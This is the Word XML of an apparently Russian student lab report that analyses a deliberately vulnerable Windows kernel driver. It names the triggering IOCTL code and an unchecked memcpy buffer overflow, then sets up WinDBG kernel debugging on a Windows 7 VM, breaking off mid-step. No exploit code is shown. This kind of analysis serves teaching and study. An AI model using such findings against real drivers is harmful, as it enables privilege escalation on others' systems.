      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00564494">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve"> Packet) обработчиками. Их адреса драйвер помещает в поле DRIVER_OBJECT::</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00564494">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
          <w:bCs/>
        </w:rPr>
        <w:t>MajorFunction</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00564494">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
          <w:bCs/>
        </w:rPr>
        <w:t>, которое, по своей сути, является массивом указателей, имеющим фиксированный размер IRP_MJ_MAXIMUM_FUNCTION + 1.</w:t>
      </w:r>
      <w:r w:rsidR="007B55BD" w:rsidRPr="007B55BD">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve"> Константа IRP_MJ_MAXIMUM_FUNCTION определена в заголовочных файлах Driver Development Kit (DDK) как 27.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4DA7674E" w14:textId="7055D92A" w:rsidR="007B55BD" w:rsidRDefault="007B55BD" w:rsidP="0085668E">
      <w:pPr>
        <w:ind w:firstLine="708"/>
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="007B55BD">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve">Параметр </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="007B55BD">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
          <w:bCs/>
        </w:rPr>
        <w:t>DeviceObject</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="007B55BD">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve"> указывает на конкретное устройство (у одного драйвера их может быть много), а </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="007B55BD">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
          <w:bCs/>
        </w:rPr>
        <w:t>Irp</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="007B55BD">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve"> – на структуру, содержащую различную информацию о запросе к устройству: контрольный код, буферы для входящих и исходящих данных, статус завершения обработки запроса и многое другое.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4BDDFA01" w14:textId="259347D8" w:rsidR="006C7B33" w:rsidRPr="006C7B33" w:rsidRDefault="006C7B33" w:rsidP="006C7B33">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="006C7B33">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
          <w:bCs/>
        </w:rPr>
        <w:t>Ниже представлена схема</w:t>
      </w:r>
      <w:r w:rsidR="00ED3AA1" w:rsidRPr="00ED3AA1">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
          <w:bCs/>
        </w:rPr>
        <w:t>,</w:t>
      </w:r>
      <w:r w:rsidRPr="006C7B33">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve"> поясняющая способ обработки запроса после вызова данной функции:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="08226AA6" w14:textId="77777777" w:rsidR="006C7B33" w:rsidRPr="006C7B33" w:rsidRDefault="006C7B33" w:rsidP="0085668E">
      <w:pPr>
        <w:ind w:firstLine="708"/>
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5E68FB25" w14:textId="77777777" w:rsidR="006C7B33" w:rsidRPr="006C7B33" w:rsidRDefault="006C7B33" w:rsidP="0085668E">
      <w:pPr>
        <w:ind w:firstLine="708"/>
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="666FA6F0" w14:textId="77777777" w:rsidR="006C7B33" w:rsidRDefault="006C7B33" w:rsidP="006C7B33">
      <w:pPr>
        <w:pStyle w:val="af8"/>
      </w:pPr>
      <w:r w:rsidRPr="006C7B33">
        <w:rPr>
          <w:noProof/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="289A78C0" wp14:editId="50252B7A">
            <wp:extent cx="2781300" cy="3029026"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="163250343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0343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7259" cy="30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E279" w14:textId="472D7C16" w:rsidR="006C7B33" w:rsidRDefault="006C7B33" w:rsidP="006C7B3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</w:t>
      </w:r>
      <w:r>
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:r w:rsidRPr="006C7B33">
        <w:t xml:space="preserve"> – </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">Путь прохождения </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>IRP</w:t>
      </w:r>
      <w:r>
        <w:t>-запроса</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3CB6551B" w14:textId="77777777" w:rsidR="008A55CA" w:rsidRDefault="008A55CA" w:rsidP="008A55CA"/>
    <w:p w14:paraId="26671203" w14:textId="3F033695" w:rsidR="008A55CA" w:rsidRDefault="008A55CA" w:rsidP="008A55CA">
      <w:r w:rsidRPr="008A55CA">
        <w:t xml:space="preserve">В качестве параметра </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="008A55CA">
        <w:t>hDevice</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="008A55CA">
        <w:t xml:space="preserve"> она получает дескриптор устройства, в </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="008A55CA">
        <w:t>lpInBuffer</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="008A55CA">
        <w:t xml:space="preserve"> и </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="008A55CA">
        <w:t>nInBufferSize</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="008A55CA">
        <w:t xml:space="preserve"> передается указатель на буфер с входящими данными и его размер, а в </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="008A55CA">
        <w:t>lpOutBuffer</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="008A55CA">
        <w:t xml:space="preserve"> и </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="008A55CA">
        <w:t>nOutBufferSize</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="008A55CA">
        <w:t xml:space="preserve"> – указатель и размер буфера для данных, которые будут возвращены драйвером.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7D0279CF" w14:textId="77777777" w:rsidR="00A504F7" w:rsidRDefault="00A504F7" w:rsidP="008A55CA"/>
    <w:p w14:paraId="694740D9" w14:textId="6EA8F8CF" w:rsidR="00A504F7" w:rsidRPr="00033F36" w:rsidRDefault="00A504F7" w:rsidP="0052447B">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>Ход работы</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1C0858AC" w14:textId="0060CD25" w:rsidR="00033F36" w:rsidRPr="00033F36" w:rsidRDefault="00033F36" w:rsidP="00033F36">
      <w:pPr>
        <w:pStyle w:val="a6"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:ind w:left="851"/>
      </w:pPr>
      <w:r w:rsidRPr="00033F36">
        <w:t>4.1</w:t>
      </w:r>
      <w:r>
        <w:tab/>
        <w:t>Анализ исходного кода драйвера</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3BB847C9" w14:textId="0D48E8A8" w:rsidR="00A504F7" w:rsidRDefault="00A504F7" w:rsidP="008A55CA">
      <w:r>
        <w:t>Итак, в драйвере</w:t>
      </w:r>
      <w:r w:rsidR="001172D4">
        <w:t xml:space="preserve"> (файл </w:t>
      </w:r>
      <w:r w:rsidR="001172D4" w:rsidRPr="001172D4">
        <w:t>.</w:t>
      </w:r>
      <w:r w:rsidR="001172D4">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>sys</w:t>
      </w:r>
      <w:r w:rsidR="001172D4">
        <w:t>)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, выданном для данной лабораторной работы, функция </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00A504F7">
        <w:t>IoCreateDevice</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00A504F7">
        <w:t xml:space="preserve"> создает объект устройства для использования драйвером</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4C4692CC" w14:textId="331DDBD1" w:rsidR="0060370D" w:rsidRPr="0060370D" w:rsidRDefault="00A504F7" w:rsidP="0060370D">
      <w:r>
        <w:t xml:space="preserve">Затем из </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>DriverObject</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00A504F7">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>вызывается полезная нагрузка драйвера.</w:t>
      </w:r>
      <w:r w:rsidR="0060370D">
        <w:t xml:space="preserve"> Самая важная функция – первая, что лежит под индексом 14 в </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="0060370D">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>MajorFunction</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="0060370D" w:rsidRPr="0060370D">
        <w:t xml:space="preserve">. </w:t>
      </w:r>
      <w:r w:rsidR="0060370D">
        <w:t>Она и была более подробно изучена.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3E94D349" w14:textId="77777777" w:rsidR="00A504F7" w:rsidRDefault="00A504F7" w:rsidP="00A504F7">
      <w:pPr>
        <w:pStyle w:val="af8"/>
      </w:pPr>
      <w:r w:rsidRPr="00A504F7">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="24731E86" wp14:editId="3B247FBB">
            <wp:extent cx="6196188" cy="3886200"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="1997326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262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8756" cy="38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A3DB" w14:textId="29A4564B" w:rsidR="00A504F7" w:rsidRDefault="00A504F7" w:rsidP="00A504F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</w:t>
      </w:r>
      <w:r>
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> – Входная точка драйвера</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="19A98F09" w14:textId="77777777" w:rsidR="0060370D" w:rsidRDefault="0060370D" w:rsidP="0060370D"/>
    <w:p w14:paraId="0B3E8E5F" w14:textId="047AF7E2" w:rsidR="0060370D" w:rsidRPr="0060370D" w:rsidRDefault="0060370D" w:rsidP="0060370D">
      <w:r>
        <w:t xml:space="preserve">Можно заметить, что код выполняется только при параметре </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>LowPart</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="001172D4" w:rsidRPr="001172D4">
        <w:t xml:space="preserve">== </w:t>
      </w:r>
      <w:r>
        <w:t>2237443.</w:t>
      </w:r>
      <w:r w:rsidRPr="0060370D">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>Вторым же входным параметром драйвера будет являться некоторый буфер (текст). Оба параметра передаются в следующую функцию.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1FEC2BF0" w14:textId="77777777" w:rsidR="00A504F7" w:rsidRDefault="00A504F7" w:rsidP="00A504F7"/>
    <w:p w14:paraId="02A94624" w14:textId="77777777" w:rsidR="00A504F7" w:rsidRDefault="00A504F7" w:rsidP="00A504F7">
      <w:pPr>
        <w:pStyle w:val="af8"/>
      </w:pPr>
      <w:r w:rsidRPr="00A504F7">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="2A1EA9D7" wp14:editId="0B1622E7">
            <wp:extent cx="6199371" cy="3893820"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="14321753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7531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5729" cy="39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360C" w14:textId="1D8BBE44" w:rsidR="00A504F7" w:rsidRDefault="00A504F7" w:rsidP="00A504F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3</w:t>
      </w:r>
      <w:r>
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> – Проверка одного из входных значений и вход в следующую функцию</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="29BDCB12" w14:textId="77777777" w:rsidR="00A504F7" w:rsidRDefault="00A504F7" w:rsidP="00A504F7"/>
    <w:p w14:paraId="381C7A0A" w14:textId="77777777" w:rsidR="00A504F7" w:rsidRDefault="00A504F7" w:rsidP="00A504F7">
      <w:pPr>
        <w:pStyle w:val="af8"/>
      </w:pPr>
      <w:r w:rsidRPr="00A504F7">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="1F94E069" wp14:editId="2A5BFF51">
            <wp:extent cx="3330229" cy="1737511"/>
            <wp:effectExtent l="0" t="0" r="3810" b="0"/>
            <wp:docPr id="275520319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20319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62E9" w14:textId="7D95340B" w:rsidR="00A504F7" w:rsidRDefault="00A504F7" w:rsidP="00A504F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4</w:t>
      </w:r>
      <w:r>
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> – Переход в уязвимую функцию</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="627E291E" w14:textId="77777777" w:rsidR="00A504F7" w:rsidRDefault="00A504F7" w:rsidP="00A504F7"/>
    <w:p w14:paraId="15465CE9" w14:textId="11C81F43" w:rsidR="00A504F7" w:rsidRPr="00D65044" w:rsidRDefault="00D65044" w:rsidP="00A504F7">
      <w:r>
        <w:t xml:space="preserve">В следующей функции не происходит проверки размера входного буфера </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Address</w:t>
      </w:r>
      <w:r w:rsidRPr="00D65044">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">с переданным размером </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>MaxCount</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00D65044">
        <w:t xml:space="preserve">. </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">И функция </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>memcpy</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>провоцирует уязвимость «переполнение буфера».</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="36A971DA" w14:textId="77777777" w:rsidR="006C7B33" w:rsidRDefault="006C7B33" w:rsidP="006C7B33"/>
    <w:p w14:paraId="4511BC6B" w14:textId="77777777" w:rsidR="006C7B33" w:rsidRDefault="006C7B33" w:rsidP="006C7B33">
      <w:pPr>
        <w:pStyle w:val="af8"/>
      </w:pPr>
      <w:r w:rsidRPr="006C7B33">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="0CFAD2D1" wp14:editId="0EDE8384">
            <wp:extent cx="5395428" cy="2552921"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="112371622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1622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D589" w14:textId="11FB1997" w:rsidR="006C7B33" w:rsidRDefault="006C7B33" w:rsidP="006C7B3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5</w:t>
      </w:r>
      <w:r>
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> – Уязвимость драйвера типа «переполнение буфера»</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0AB0D758" w14:textId="77777777" w:rsidR="00D65044" w:rsidRDefault="00D65044" w:rsidP="00D65044"/>
    <w:p w14:paraId="5DF9918D" w14:textId="19176F1B" w:rsidR="00033F36" w:rsidRDefault="00033F36" w:rsidP="00033F36">
      <w:pPr>
        <w:pStyle w:val="a6"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:ind w:left="851"/>
      </w:pPr>
      <w:r w:rsidRPr="00033F36">
        <w:t>4.</w:t>
      </w:r>
      <w:r>
        <w:t>2</w:t>
      </w:r>
      <w:r>
        <w:tab/>
        <w:t>Настройка виртуальной машины и отладчика</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="286945FA" w14:textId="5062B635" w:rsidR="00D65044" w:rsidRPr="00E24E33" w:rsidRDefault="001172D4" w:rsidP="00D65044">
      <w:r>
        <w:t xml:space="preserve">После статического анализа была настроена виртуальная машина с возможностью ее отладки с использованием отладчика </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>W</w:t>
      </w:r>
      <w:r w:rsidR="00E24E33">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>nDBG</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="001172D4">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>c</w:t>
      </w:r>
      <w:r w:rsidRPr="001172D4">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Windows</w:t>
      </w:r>
      <w:r w:rsidRPr="001172D4">
        <w:t xml:space="preserve"> 7 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>x</w:t>
      </w:r>
      <w:r w:rsidRPr="001172D4">
        <w:t>86.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="15B40584" w14:textId="7B9AE96C" w:rsidR="001172D4" w:rsidRDefault="001172D4" w:rsidP="00D65044">
      <w:r>
        <w:t xml:space="preserve">Для этого на новой выключенной виртуальной машине необходимо </w:t>
      </w:r>
      <w:r w:rsidR="00B40B39">
        <w:t xml:space="preserve">включить тестовый режим и </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">настроить </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>serial</w:t>
      </w:r>
      <w:r w:rsidRPr="001172D4">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>port</w:t>
      </w:r>
      <w:r w:rsidRPr="001172D4">
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0A4F2A56" w14:textId="77777777" w:rsidR="00B40B39" w:rsidRDefault="00B40B39" w:rsidP="00D65044"/>
    <w:p w14:paraId="73853182" w14:textId="77777777" w:rsidR="00B40B39" w:rsidRDefault="00B40B39" w:rsidP="00B40B39">
      <w:pPr>
        <w:pStyle w:val="af8"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="65A749C6" wp14:editId="194C9906">
            <wp:extent cx="6300470" cy="3235960"/>
            <wp:effectExtent l="0" t="0" r="5080" b="2540"/>
            <wp:docPr id="475171396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71396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8487" w14:textId="42646A22" w:rsidR="00B40B39" w:rsidRDefault="00B40B39" w:rsidP="00B40B3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6</w:t>
      </w:r>
      <w:r>
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> – Включение тестового режима на </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Windows</w:t>
      </w:r>
      <w:r w:rsidRPr="00B40B39">
        <w:t xml:space="preserve"> 7</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="31E12AE3" w14:textId="77777777" w:rsidR="00B40B39" w:rsidRPr="00B40B39" w:rsidRDefault="00B40B39" w:rsidP="00D65044"/>
    <w:p w14:paraId="786DE483" w14:textId="267D1513" w:rsidR="001172D4" w:rsidRPr="00524FB3" w:rsidRDefault="00E24E33" w:rsidP="00E24E33">
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">После запуска машины можно проверить в </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Computer</w:t>
      </w:r>
      <w:r w:rsidRPr="001172D4">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Management</w:t>
      </w:r>
      <w:r>
        <w:t>, что порт появился</w:t>
      </w:r>
      <w:r w:rsidRPr="00146996">
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6668828A" w14:textId="77777777" w:rsidR="00B40B39" w:rsidRPr="00524FB3" w:rsidRDefault="00B40B39" w:rsidP="00E24E33"/>
    <w:p w14:paraId="6BD8924E" w14:textId="77777777" w:rsidR="001172D4" w:rsidRDefault="001172D4" w:rsidP="001172D4">
      <w:pPr>
        <w:pStyle w:val="af8"/>
      </w:pPr>
      <w:r w:rsidRPr="001172D4">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="6FB4AE15" wp14:editId="6C5B748F">
            <wp:extent cx="5067300" cy="4298676"/>
            <wp:effectExtent l="0" t="0" r="0" b="6985"/>
            <wp:docPr id="2548098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0985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920" cy="430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4D4" w14:textId="3B15AAAE" w:rsidR="00146996" w:rsidRPr="00E24E33" w:rsidRDefault="001172D4" w:rsidP="00E24E33">
      <w:pPr>
        <w:pStyle w:val="ad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7</w:t>
      </w:r>
      <w:r>
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> – </w:t>
      </w:r>
      <w:r>
        <w:t>Настройка порта</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0489FB99" w14:textId="77777777" w:rsidR="00146996" w:rsidRDefault="00146996" w:rsidP="00146996">
      <w:pPr>
        <w:pStyle w:val="af8"/>
      </w:pPr>
      <w:r w:rsidRPr="00146996">
        <w:rPr>
          <w:noProof/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="7BBBFF5C" wp14:editId="16DE4FEF">
            <wp:extent cx="3421380" cy="4014756"/>
            <wp:effectExtent l="0" t="0" r="7620" b="5080"/>
            <wp:docPr id="13041596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5964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4637" cy="40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125" w14:textId="60982D9E" w:rsidR="00146996" w:rsidRDefault="00146996" w:rsidP="0014699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8</w:t>
      </w:r>
      <w:r>
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:r w:rsidRPr="00146996">
        <w:t xml:space="preserve"> – </w:t>
      </w:r>
      <w:r>
        <w:t>Порт появился</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="53E8028F" w14:textId="77777777" w:rsidR="00146996" w:rsidRDefault="00146996" w:rsidP="00146996"/>
    <w:p w14:paraId="353CBA86" w14:textId="6F712BF0" w:rsidR="00146996" w:rsidRDefault="00146996" w:rsidP="00146996">
      <w:r>
        <w:t xml:space="preserve">Далее необходимо запустить утилиту </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>msconfig</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00146996">
        <w:t>.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>exe</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r w:rsidRPr="00146996">
        <w:t xml:space="preserve">предоставляющую интерфейс для управления файлами, </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00146996">
        <w:t>запускающимися</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00146996">
        <w:t xml:space="preserve"> при загрузке Windows</w:t>
      </w:r>
      <w:r>
        <w:t>, и задать настройки для возможности отладки виртуальной машины.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="600FC42F" w14:textId="77777777" w:rsidR="00146996" w:rsidRDefault="00146996" w:rsidP="00146996"/>
    <w:p w14:paraId="632E5746" w14:textId="77777777" w:rsidR="00146996" w:rsidRDefault="00146996" w:rsidP="00146996">
      <w:pPr>
        <w:pStyle w:val="af8"/>
      </w:pPr>
      <w:r w:rsidRPr="00146996">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="512BDB36" wp14:editId="3440685B">
            <wp:extent cx="6300470" cy="3307080"/>
            <wp:effectExtent l="0" t="0" r="5080" b="7620"/>
            <wp:docPr id="95401749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1749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B5A3" w14:textId="50A42202" w:rsidR="00146996" w:rsidRDefault="00146996" w:rsidP="0014699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9</w:t>
      </w:r>
      <w:r>
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> – Настройка виртуальной машины</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="465649A2" w14:textId="77777777" w:rsidR="00146996" w:rsidRDefault="00146996" w:rsidP="00146996"/>
    <w:p w14:paraId="5C7326B7" w14:textId="5AC20AEC" w:rsidR="00146996" w:rsidRPr="00B40B39" w:rsidRDefault="00146996" w:rsidP="00146996">
      <w:r>
        <w:t xml:space="preserve">Далее необходимо </w:t>
      </w:r>
      <w:r w:rsidR="00656BE4">
        <w:t xml:space="preserve">перезагрузить и </w:t>
      </w:r>
      <w:r>
        <w:t>закрыть виртуальную машину</w:t>
      </w:r>
      <w:r w:rsidR="00656BE4">
        <w:t>,</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> открыть на хосте </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>WinDBG</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="005F19D8" w:rsidRPr="005F19D8">
        <w:t xml:space="preserve">. </w:t>
      </w:r>
      <w:r w:rsidR="00DF2217">
        <w:t xml:space="preserve">Затем необходимо добавить среду, которая будет отлаживаться с помощью </w:t>
      </w:r>
      <w:r w:rsidR="00DF2217">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Edit</w:t>
      </w:r>
      <w:r w:rsidR="00DF2217" w:rsidRPr="00DF2217">
        <w:t xml:space="preserve"> &gt; </w:t>
      </w:r>
      <w:r w:rsidR="00524FB3">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Attach</w:t>
      </w:r>
      <w:r w:rsidR="00524FB3" w:rsidRPr="00524FB3">
